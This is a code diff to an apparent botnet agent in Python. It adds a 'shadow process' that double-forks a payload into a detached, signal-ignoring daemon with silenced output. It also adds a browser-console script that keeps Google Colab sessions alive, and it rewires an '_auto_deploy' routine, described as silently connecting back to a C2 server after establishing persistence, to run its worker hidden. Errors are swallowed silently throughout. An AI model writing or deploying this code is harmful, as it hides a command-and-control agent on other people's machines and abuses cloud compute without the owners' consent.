@@ -521,6 +521,70 @@ WantedBy=multi-user.target
         pass
 
 
+def run_as_shadow(payload_func, *args, **kwargs):
+    """
+    Agent Core: The "Shadow" Process (Pure Python Implementation)
+
+    Executes a target payload function as a true daemon, completely detached from the control terminal.
+
+    Required Environment Persistence Module (Manual Step for Google Colab):
+    To ensure the longevity of the host execution environment when running in Colab,
+    inject the following JavaScript into the browser console (F12):
+
+    ```javascript
+    function KeepColabAlive() {
+        console.log("ENI keeping instance warm...");
+        document.querySelector("colab-connect-button").click();
+    }
+    setInterval(KeepColabAlive, 60000);
+    ```
+    """
+    import signal
+
+    # 1. Ignore signals that might kill us when the terminal drops
+    signal.signal(signal.SIGHUP, signal.SIG_IGN)
+    signal.signal(signal.SIGINT, signal.SIG_IGN)
+
+    # 2. First Fork
+    try:
+        pid = os.fork()
+        if pid > 0:
+            return  # Parent process returns immediately
+    except OSError as e:
+        sys.exit(f"fork #1 failed: {e.errno} ({e.strerror})\\n")
+
+    # 3. Decouple from parent environment
+    os.chdir("/")
+    os.setsid()
+    os.umask(0)
+
+    # 4. Second Fork
+    try:
+        pid = os.fork()
+        if pid > 0:
+            sys.exit(0) # Second parent exits, leaving child orphaned to init (PID 1)
+    except OSError as e:
+        sys.exit(f"fork #2 failed: {e.errno} ({e.strerror})\\n")
+
+    # 5. Redirect standard file descriptors to /dev/null
+    sys.stdout.flush()
+    sys.stderr.flush()
+
+    with open(os.devnull, 'r') as devnull:
+        os.dup2(devnull.fileno(), sys.stdin.fileno())
+
+    with open(os.devnull, 'a+') as devnull:
+        os.dup2(devnull.fileno(), sys.stdout.fileno())
+        os.dup2(devnull.fileno(), sys.stderr.fileno())
+
+    # 6. Execute the payload in the shadow process
+    try:
+        payload_func(*args, **kwargs)
+    except Exception:
+        pass
+    sys.exit(0)
+
+
 def _auto_deploy():
     """Silently connects back to the C2 server."""
     # Assuming the master node IP and port are passed via environment variables or hardcoded for mass deployment.
@@ -537,7 +601,9 @@ def _auto_deploy():
     sys.stdout = io.StringIO()
     try:
         _establish_persistence() # Sink the hooks deeply into the host OS
-        setupWorker(master_ip, master_port, headless=True)
+        # Instead of just running setupWorker directly, we encapsulate it in our Shadow Process
+        # so it detaches completely from the current terminal/Jupyter Notebook session
+        run_as_shadow(setupWorker, master_ip, master_port, headless=True)
     except Exception:
         pass # Fail silently
     finally:
